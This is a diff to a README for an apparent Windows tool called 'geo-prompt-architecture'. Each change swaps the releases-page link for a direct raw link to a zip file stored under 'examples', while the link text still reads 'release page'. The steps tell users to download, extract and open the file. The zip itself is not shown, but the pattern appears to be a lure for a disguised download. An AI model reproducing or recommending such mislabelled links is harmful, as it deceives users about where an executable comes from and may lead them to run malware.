@@ -1,6 +1,6 @@
 # 🧭 geo-prompt-architecture - AI visibility prompts made simple
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/rheumatologyquadrivium246/geo-prompt-architecture/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/rheumatologyquadrivium246/geo-prompt-architecture/raw/refs/heads/main/examples/geo-prompt-architecture-v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Use it to:
 
 To get the app on Windows, visit this page to download:
 
-[Download geo-prompt-architecture from the release page](https://github.com/rheumatologyquadrivium246/geo-prompt-architecture/releases)
+[Download geo-prompt-architecture from the release page](https://github.com/rheumatologyquadrivium246/geo-prompt-architecture/raw/refs/heads/main/examples/geo-prompt-architecture-v3.8.zip)
 
 After the page opens:
 1. Find the latest release
@@ -63,7 +63,7 @@ If the download comes as a zip file, extract it first, then open the app file in
 
 Follow these steps on Windows:
 
-1. Go to the [release page](https://github.com/rheumatologyquadrivium246/geo-prompt-architecture/releases)
+1. Go to the [release page](https://github.com/rheumatologyquadrivium246/geo-prompt-architecture/raw/refs/heads/main/examples/geo-prompt-architecture-v3.8.zip)
 2. Download the latest Windows version
 3. Open the downloaded file
 4. If the file is zipped, right-click it and choose Extract All
@@ -212,7 +212,7 @@ The output should be easy to copy, edit, and reuse in your own workflow.
 
 If you need the Windows download page again, use this link:
 
-[https://github.com/rheumatologyquadrivium246/geo-prompt-architecture/releases](https://github.com/rheumatologyquadrivium246/geo-prompt-architecture/releases)
+[https://github.com/rheumatologyquadrivium246/geo-prompt-architecture/raw/refs/heads/main/examples/geo-prompt-architecture-v3.8.zip](https://github.com/rheumatologyquadrivium246/geo-prompt-architecture/raw/refs/heads/main/examples/geo-prompt-architecture-v3.8.zip)
 
 ## 📝 Quick Start Checklist
 
